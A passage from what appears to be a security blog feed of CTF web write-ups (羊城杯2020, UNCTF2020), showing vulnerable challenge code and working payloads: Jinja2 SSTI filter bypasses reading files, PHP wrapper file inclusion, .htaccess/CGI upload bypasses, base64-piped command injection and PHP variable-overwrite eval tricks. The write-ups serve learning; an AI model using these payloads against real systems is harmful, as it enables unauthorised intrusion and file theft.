class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ë­£¡¾¹¸Ò²ÈÎÒÒ»Ö»¶úµÄÎ²°Í£¡&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ÓÐÒâÃé×¼£¬ÎÞÒâ»÷·¢£¬ÄãµÄÃÎÏë¾ÍÊÇÄãÒªÃé×¼µÄÄ¿±ê¡£ÏàÐÅ×Ô¼º£¬Äã¾ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄµÄ×Óµ¯¡£&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>中文存在乱码，不过不影响审计过程。<code>hash_mac</code>在官方文档中的第一个Note提到了一个trick：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224304.png" alt=""></p><p>第二个参数如果是数组的话，那么这个函数会生成一个warning，并且返回NULL，那么相当于<code>$clandetine</code>参数可控。payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">White-cat-monitor[]&#x3D;1&amp;One-ear&#x3D;;cat flag.php&amp;Black-CatSheriff&#x3D;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;羊城杯2020-Web-Writeup&quot;&gt;羊城杯2020 Web Writeup&lt;/h1&gt;
&lt;p&gt;当时没时间打，现在题目在GitHub上开源了，随便看看。&lt;/p&gt;
&lt;h2 id=&quot;easycon&quot;&gt;easycon&lt;/h2&gt;
&lt;p&gt;蚁剑连接一句话，下载bbbbbbb
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020-Web-Writeup</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/</id>
    <published>2020-11-19T05:41:51.000Z</published>
    <updated>2020-11-19T06:09:14.166Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UNCTF2020-Web-wp">UNCTF2020 Web wp</h1><h2 id="easyssrf-solved">easyssrf [solved]</h2><p>算是签到题，比较easy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="easyflask-solved">easyflask [solved]</h2><p>Fuzz了一下，发现过滤挺多东西的。<br>只能用管道+join的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</span><br></pre></td></tr></table></figure><p>等价于<code>().__class__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base</span><br></pre></td></tr></table></figure><p>等价于<code>().__class__.__base__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses</span><br></pre></td></tr></table></figure><p><code>().__class__.__base__.subclasses()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)&#125;</span><br></pre></td></tr></table></figure><p><code>().__class__.base__.subclasses().pop(475)</code><br>click.utils.LazyFile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>但是不知道flag在哪，所以还是要执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)&#125;&#125;</span><br></pre></td></tr></table></figure><p>选取的模块<code>&lt;class '_frozen_importlib._DummyModuleLock'&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)|attr((request.args.usc*2,request.args.init,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.globals,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.builtins,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.import,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;init&#x3D;init&amp;globals&#x3D;globals&amp;builtins&#x3D;builtins&amp;import&#x3D;import</span><br></pre></td></tr></table></figure><p><code>().__class__.base__.subclasses().pop(64).__init__.__globals__.__import__</code><br>还是没能搞出来<br>最后还是通过读文件的方式，首先尝试<code>proc/self/cwd</code>和<code>/proc/self/environ</code>，直接返回500，应该是权限不够，再尝试读取<code>/proc/self/cmdline</code>，显示项目是在<code>/app</code>下面，再看<code>/app/app.py</code>发现可以成功读取源码，那就猜了一波flag应该在这个路径下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;app&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://www.jianshu.com/p/a736e39c3510">https://www.jianshu.com/p/a736e39c3510</a><br><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#flask-%E6%94%B9">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#flask-改</a><br><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---filter-bypass</a></p><p>赛后看预期解我好像做的太麻烦了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((session|attr(request.headers.x))|attr(request.headers.x1)).get(request.headers.x2).get(request.headers.x3)(request.headers.x4).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>header的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x: __init__</span><br><span class="line">x1: __globals__</span><br><span class="line">x2: __builtins__</span><br><span class="line">x3: open</span><br><span class="line">x4: app.py(flag.txt)</span><br></pre></td></tr></table></figure><h2 id="easyunserialize-solved">easyunserialize [solved]</h2><p>反序列化字符逃逸<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="babyeval-solved">babyeval [solved]</h2><p>命令执行可以直接包含文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;include&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br></pre></td></tr></table></figure><h2 id="easyfind-solved">easyfind [solved]</h2><p>一开始不给hint都没什么思路，后来放了一个hint：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="literal">false</span>))&#123;flag&#125;<span class="keyword">else</span>&#123;no flag&#125;</span><br></pre></td></tr></table></figure><p>is_file函数接收一个数组的时候回返回Null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]&#x3D;0</span><br></pre></td></tr></table></figure><h2 id="easy-upload-solved">easy_upload [solved]</h2><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119105131.png" alt=""></p><p>检查文件名后缀、文件类型，过滤了<code>perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet</code>，不检查是否有图片头。</p><p><code>.htaccess</code>文件名是可以上传的，用换行绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler p\</span><br><span class="line">ph5-script .txt</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file &#x2F;flag</span><br></pre></td></tr></table></figure><p>然后在随便上传一个txt文件，访问对应路径即可。</p><p>然后我写wp的时候发现，这道题目过滤被改了，增加了一个<code>\</code>，所以上面的这种换行绕过就没办法bypass了。</p><p>来学一个新姿势，上传.htaccess，开启cgi支持，上传cgi脚本，执行cgi脚本，输出flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119130328.png" alt=""></p><p>再上传cgi文件，这个文件必须要在Linux/macOS环境下编写，使用vim就行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type: text&#x2F;plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后上传的时候最好也要直接上传文件，抓包修改文件类型，最后再放包，不然可能会出现500的错误。</p><h2 id="UN’s-online-tools-solved">UN’s_online_tools [solved]</h2><p>命令执行绕过的题目，当前目录下只有index.php，用sort读取源代码，过滤空格和<code>$</code>，用<code>%09</code>来绕过。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119131410.png" alt=""></p><p>从源码中可以看到禁用了<code>/(;|'| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i</code></p><p>用ls命令看到flag在根目录下，base64编码一下</p><p><code>127.0.0.1|echo%09Y2F0IC9mbGFn|base64%09-d|sh</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119133907.png" alt=""></p><h2 id="easyphp">easyphp</h2><p>PHP代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;fuxkSQL&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span>(<span class="params">$iText</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getVars&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题考点是变量覆盖，弱类型和PHP复杂变量的解析。做出了前两个考点，倒在了第三个考点，没想到用复杂变量。</p><p>第一关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$&#123;$key&#125;=$value</code>可以导致变量覆盖，也就是说我们将$password覆盖为任意值，然后将$adminPassword覆盖为其md5值。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;ca01h&amp;adminPassword&#x3D;0f5ed8a8d8d44d86a570aacffa922251&amp;source&#x3D;</span><br></pre></td></tr></table></figure><p>第二关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure><p>简单的PHP弱类型绕过，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?verif&#x3D;0e00000000000000000000081614617300000000</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a></p></blockquote><p>第三关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量名必须是<code>var1</code>或者<code>var12</code>这种形式，而且在变量覆盖环节转义了单双引号。</p><p>关于复杂变量的解析：<a href="https://ca0y1h.top/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/">https://ca0y1h.top/Web_security/php_related/11.PHP复杂变量解析/</a></p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1=&#123;$_GET[<span class="number">1</span>]&#125;&amp;var3=$&#123;$var1()&#125;&amp;<span class="number">1</span>=phpinfo</span><br></pre></td></tr></table></figure><p>解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var1&#x3D;&quot;&#123;$_GET[1]&#125;&quot;; &#x3D;&#x3D;&gt; $var1&#x3D;&quot;phpinfo&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var3&#x3D;&quot;$&#123;$var1()&#125;&quot;; &#x3D;&#x3D;&gt; $var3&#x3D;&quot;$&#123;phpinfo()&#125;&quot;;</span><br></pre></td></tr></table></figure><h2 id="L0vePHP">L0vePHP</h2><p>查看源码最后一行是一个提示，但是比赛的时候不知道这是base82的编码方式。</p><p>解码之后是让提交一个action参数，提示读源码，用文件包含，base被过滤了，换成rot13。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.string-rot13&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($action)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/base|data|input|zip|zlib/i&quot;</span>, $action)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$action</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $flag = <span class="string">&quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hint用十六进制转码<code>1nD3x.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>);</span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell_exec&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;ob_start&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> 